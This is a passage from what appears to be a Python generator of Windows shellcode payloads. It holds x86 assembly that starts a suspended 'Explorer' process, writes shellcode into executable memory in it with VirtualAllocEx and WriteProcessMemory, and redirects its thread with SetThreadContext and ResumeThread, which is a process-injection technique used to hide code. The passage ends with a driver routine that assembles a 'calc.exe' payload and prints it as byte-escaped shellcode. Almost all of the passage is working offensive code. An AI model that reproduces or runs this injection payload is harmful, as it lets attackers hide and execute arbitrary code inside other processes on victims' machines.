        subl $68,%esp
        movl %esp,%ecx
        // PROCESS_INFORMATION
        subl $16,%esp
        movl %esp,%edx
        // CONTEXT
        subl $716,%esp
        movl %esp,%edi
        
        // save vars for later use
        pushl %edx   // PROCESS INFORMATION
        pushl %edi   // CONTEXT
        pushl %ecx   // STARTUPINFO
        
        // zero out vars before use
        // 800 bytes total
        decl %eax // eax was 1
        movl $800, %ecx
        rep stosb
        
        // restore %ecx
        popl  %ecx
        pushl %ecx
        
        // "Explorer" string
        pushl %eax
        pushl $0x7265726f
        pushl $0x6c707845
        //pushl $0x00646170
        //pushl $0x65746f6e

        movl %esp,%esi
        
        // &PROCESS_INFORMATION
        pushl %edx
        // &STARTUPINFO = {0}
        // movl %eax,(%ecx) // we dont need this one, we already zero it out
        pushl %ecx
        // NULL
        pushl %eax
        // NULL
        pushl %eax
        // CREATE_SUSPENDED
        pushl $4
        // 0
        pushl %eax
        // NULL
        pushl %eax
        // NULL
        pushl %eax
        // "cmd"
        pushl %esi
        // NULL
        pushl %eax
        call CREATEPROCESSA-getpcloc(%ebp)

        
        // reset string space 
        popl %eax
        popl %eax
        popl %eax
        
        // restore pointers Context and ProcessInformation
        //movl (%esp),%edi
        //movl 4(%esp),%edx

        popl %ecx
        popl %edi
        popl %edx

        pushl %edx   // PROCESS INFORMATION
        pushl %edi   // CONTEXT
        pushl %ecx   // STARTUPINFO
        
        movl %edx, %esi // esi now also have the PROCESS INFORMATION
        
        // ctx.ContextFlag=Context_FULL
        movl $0x10007, (%edi)
        // &ctx
        pushl %edi
        // pi.hThread
        pushl 4(%edx)
        call GETTHREADCONTEXT-getpcloc(%ebp)
        
        // restore pointers
        //movl 8(%esp),%edx

        // PAGE_EXECUTE_READWRITE
        pushl $0x40
        // MEM_COMMIT
        pushl $0x1000
        // size
        pushl $0x5000
        // NULL
        xorl %eax,%eax
        pushl %eax
        // pi.hProcess
        pushl (%esi) // PROCESS INFORMATION
        call VIRTUALALLOCEX-getpcloc(%ebp)

        // restore pointers
        //movl 4(%esp),%edx
        
        // address is in %eax
        pushl %eax
        
        // NULL
        xorl %ecx,%ecx
        pushl %ecx
        // opcode len !!!
        leal shellcodestart-getpcloc(%ebp),%edx
        leal endmark-getpcloc(%ebp),%ecx
        subl %edx,%ecx
        //addl $300, %ecx //not needed.
        pushl %ecx
        // source buf
        pushl %edx
        // target addy
        pushl %eax
        // pi.hProcess
        pushl (%esi)
        call WRITEPROCESSMEMORY-getpcloc(%ebp)

        popl %eax
        
        // restore pointers
        popl  %ecx
        popl  %edi
        //pushl %edi
        //pushl %ecx
        

        // ctx.ContextFlags = CONTEXT_FULL
        movl $0x10007,(%edi)
        // ctx.Eip = targetaddy
        movl %eax,184(%edi)
        // &ctx
        pushl %edi
        // pi.hThread
        pushl 4(%esi)
        call SETTHREADCONTEXT-getpcloc(%ebp)
        
        // restore pointers
        //movl 4(%esp),%edx
        
        // pi.hThread
        pushl 4(%esi)
        call RESUMETHREAD-getpcloc(%ebp)
        
postfork:
        // reset stack and ret?
        // we should really save state before findeip muck
        // and restore (popa?) at this point to ret or whatever
        // dave - hmm. Shouldn't we instead jmp exit? or even a jmp forkparent:
        addl $804,%esp
        
        //xorl %eax,%eax
        //pushl %eax
        pushl $0 
        call EXITTHREAD-getpcloc(%ebp)
        
forkthis:
         int3
endmark:
        """
        
        
        #if args == None:
        #codegen.main = codegen.main.replace("ESPPATCH", patch)
        # else we patch

        
        return codegen.get()


    
if __name__ == '__main__':
    import sys;
    import struct;
    line = 0
    p = payloads()
    print "### KOSTYA PAYLOAD EXECUTOR 2000 NG ####"
    asm = p.kostya_exec("calc.exe")
    print asm
    bin = p.assemble(asm)
    # mod 4 align
    while len(bin) % 4:
        bin += "P"
    for c in bin:
        if not line:
            sys.stdout.write("\"")
        sys.stdout.write("\\x%.2x" % ord(c))
        line += 1
        if line == 16:
            sys.stdout.write("\"\n")
            line = 0
    i = 0
    line = 0
    sys.stdout.write("\n");
    while i < len(bin):
        dword = struct.unpack("<L", bin[i:i+4])[0]
        sys.stdout.write("0x%.8X, " % dword)
        line += 1
        i += 4
        if line == 4:
            sys.stdout.write("\n")
            line = 0
    sys.stdout.write("\n")            
